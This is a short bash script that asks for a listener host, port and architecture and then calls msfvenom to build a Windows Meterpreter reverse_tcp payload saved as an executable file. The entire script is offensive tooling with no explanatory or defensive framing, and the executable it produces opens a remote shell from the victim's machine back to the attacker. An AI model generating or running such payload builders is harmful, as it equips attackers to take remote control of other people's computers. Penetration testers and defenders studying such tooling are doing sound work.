#!/bin/bash

#!/bin/bash

read -p "[+] Enter LHOST : " LHOST
read -p "[+] Enter LPORT : " LPORT
read -p "[+] Archecture (x86/x64) : " arch

echo "LHOST : $LHOST"
echo "LPORT : $LPORT"
echo "ARCH : $arch" 

sudo msfvenom -p windows/$arch/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT R > ../wd-generated/exepayload$arch.exe